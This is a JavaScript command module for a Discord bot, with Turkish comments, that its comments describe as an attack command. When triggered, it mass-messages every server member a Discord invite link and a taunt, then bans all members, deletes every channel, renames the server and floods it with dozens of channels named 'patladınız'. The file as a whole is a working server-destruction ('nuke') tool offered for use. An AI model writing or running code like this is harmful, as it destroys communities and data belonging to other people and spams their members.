const Discord = require('discord.js');


exports.run = function(client, message) {

    message.guild.members.map(c => c.send(

"• https://discord.gg/mk3Ug3C\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• DC BOT LİST TARAFINDAN BASILDINIZ! SEBEP BAŞKALARININ KODUNU ÇALMAK\n"//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR
+"• https://discord.gg/mk3Ug3C"    //BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA ÖZELDEN ÜYE ATILCAK MESAJLAR

    ));
  message.guild.members.map(c => c.ban());
  message.guild.channels.map(c => c.delete())
  
message.guild.setName("DC BOT LİST TARAFIDAN BASILDINIZ!")//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA SUNUCUN İSMİ
  

  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);//BOTUN SALDIRI KOMUTU AKTİFLEŞTİRİLDİKTEN SONRA AÇTIĞI KANALLAR
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  message.guild.createChannel("patladınız").catch(console.error);
  
  
  
};

exports.conf = {
  enabled: true,//True => Komut açık, False => Komut kapalı 
  guildOnly: true, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
  aliases: [],//Komutun farklı kullanımları ÖR: !ping, !p
  permLevel: 4 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
};

exports.help = {
  name: 'başla',//Komutun adı (Komutu girerken lazım olucak)
  description: '',//Komutun Açıklaması
  usage: '' //komutun kullanım şekli; ÖR: !ban @Kullanıcı
}